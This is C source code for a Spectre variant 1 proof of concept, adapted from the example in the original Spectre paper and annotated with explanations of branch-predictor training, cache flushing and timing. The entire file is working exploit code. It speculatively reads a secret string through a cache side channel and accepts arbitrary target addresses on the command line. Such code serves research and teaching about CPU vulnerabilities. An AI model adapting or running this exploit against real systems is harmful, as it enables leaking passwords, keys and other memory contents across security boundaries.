/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t array1[160] = {
	1, 2, 3, 4, 5, 6,
	7, 8, 9, 10, 11, 12,
	13, 14, 15, 16
};
uint8_t array2[256 * 512];
/*
 * The `unuse array` to ensure we hit different cache lines. 
 * On many processors (e.g Intel i3, i5, i7, ARM Cortex A53, etc) the L1 cache has 64 bytes per line.
*/
uint8_t unused1[64];
uint8_t unused2[64];

char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

static void victim_function(size_t x) 
{
	/* 
	 * 1. Reads array1_size. This results in a cache miss.(cause we already call cflush before, `array_size` is not in cache)
	 * 2. While the processor is fetching array1_size - which is "long" because there is a cache miss - the branch predictor assumes the if will be true (bad guess).
	 * 3. Speculative read of array1[x]. This is fast because it's a cache hit.
	 * 4. Read array2[array1[x] * 512]. This is long (cache miss).
	 * 5. While the read at step 4 is pending, the value of step 1 arrives. The processor realizes it made a bad guess and rewinds its state.
	*/
	if (x < array1_size)
		temp &= array2[array1[x] * 512];
}

/*
 * The attacker
*/
/* Report best guess in value[0] and runner-up in value[1] */
static void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) 
{
	static int results[256];
	int tries, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	int i, j, k;

	memset(results, 0, sizeof(results));
	
	for (tries = 999; tries > 0; tries--) {
		/* Flushing array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i*512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			/* Flushing `array_size` from cache */
			_mm_clflush(&array1_size);
			/* Delay (can also mfence), make sure the CPU will not re-order */
			for (volatile int z = 0; z < 100; z++) {}

			/* 
			 * We quickly understand that the lines will generate five times a small x, 
			 * which will lead to victim_function(x) to take the branch. 
			 * Those five times are there to train the branch predictor to assume the branch will be taken... 
			 * Because of the five prior trainings, a vulnerable process will speculatively execute the if branch on the sixth iteration.
			*/
			x = ((j % 6) - 1) & ~0xFFFF; // Set x=FFF.FF0000 if j%6==0, else x=0
			x = (x | (x >> 16)); // Set x=-1 if j&6=0, else x=0
			x = training_x ^ (x & (malicious_x ^ training_x));
			
			/* Call the victim, assure get the BAD branch guest */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 0xff;
			addr = &array2[mix_i*512];
			/*
			 * We need to accuratly measure the memory access to the current index of the
			 * array so we can determine which index was cached by the malicious mispredicted code.
			 * The best way to do this is to use the rdtscp instruction, which measures current
			 * processor ticks, and is also serialized.
			 */
			time1 = __rdtscp(&junk);	// READ TIMER
			junk = *addr;				// MEMORY ACCESS TO TIME 
			time2 = __rdtscp(&junk) - time1; // READ TIMER & COMPUTE ELAPSED TIME
			
			if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; //Clear success if best is > 2*runner-up + 5 or 2/0) 
	}

	results[0] ^= junk; //use junk so code above won’t get optimized out
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

/*
 * Command line arguments:
 * 1: Cache hit threshold (int)
 * 2: Malicious address start (size_t)
 * 3: Malicious address count (int)
*/
int main(int argc, char **argv)
{
	/* Default to a cache hit threshold of 80 */
	int cache_hit_threshold = 80;
	/* Default for malicious_x is the secret string address */
	size_t malicious_x = (size_t)(secret - (char *)array1);
	/* Default addresses to read is 40 (which is the length of the secret string) */
	int len = 40;
	int score[2];
	uint8_t value[2];

	printf("The address of array1(.bss) = %p, secret(.text) = %p\n", (void *)array1, (void *)secret);


	for (int i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	/* Parse the cache_hit_threshold from the first command line argument.
	   (OPTIONAL) */
	if (argc >= 2)
		sscanf(argv[1], "%d", &cache_hit_threshold);

	/* Parse the malicious x address and length from the second and third
	   command line argument. (OPTIONAL) */
	if (argc >= 4) {
		sscanf(argv[2], "%p", (void **)(&malicious_x));
		/* Convert input value into a pointer */
		malicious_x -= (size_t) array1;
		sscanf(argv[3], "%d", &len);
	}

	/* Print cache hit threshold */
	printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
	printf("Reading %d bytes:\n", len);
	/* Start the read loop to read each address */
	while (--len >= 0) {
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		/*
		 * Call readMemoryByte with the required cache hit threshold and
		 * malicious x address. value and score are arrays that are
		 * populated with the results.
		*/
		readMemoryByte(cache_hit_threshold, malicious_x++, value, score);

		/* Display the results */
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X=’%c’ score=%d ", value[0],
				(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

		if (score[1] > 0) {
			printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
					(value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
		}
		printf("\n");
	}

	return 0;
}
